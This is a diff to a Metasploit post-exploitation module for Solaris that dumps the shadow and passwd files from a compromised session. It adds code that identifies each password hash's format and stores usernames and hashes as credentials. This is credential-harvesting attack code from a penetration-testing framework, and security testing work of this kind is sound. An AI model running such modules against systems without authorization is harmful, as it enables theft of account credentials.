@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
+require 'metasploit/framework/hashes/identify'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Solaris::Priv
 
@@ -32,12 +30,28 @@ class MetasploitModule < Msf::Post
       # Save in loot the passwd and shadow file
       p1 = store_loot("solaris.shadow", "text/plain", session, shadow_file, "shadow.tx", "Solaris Password Shadow File")
       p2 = store_loot("solaris.passwd", "text/plain", session, passwd_file, "passwd.tx", "Solaris Passwd File")
-      vprint_status("Shadow saved in: #{p1.to_s}")
-      vprint_status("passwd saved in: #{p2.to_s}")
+      vprint_good("Shadow saved in: #{p1.to_s}")
+      vprint_good("passwd saved in: #{p2.to_s}")
 
       # Unshadow the files
       john_file = unshadow(passwd_file, shadow_file)
       john_file.each_line do |l|
+        hash_parts = l.split(':')
+        jtr_format = identify_hash hash_parts[1]
+        if jtr_format.empty? #overide the default
+          jtr_format = 'des,bsdi,crypt'
+        end
+        credential_data = {
+            jtr_format: jtr_format,
+            origin_type: :session,
+            post_reference_name: self.refname,
+            private_type: :nonreplayable_hash,
+            private_data: hash_parts[1],
+            session_id: session_db_id,
+            username: hash_parts[0],
+            workspace_id: myworkspace_id
+        }
+        create_credential(credential_data)
         print_good(l.chomp)
       end
       # Save pwd file
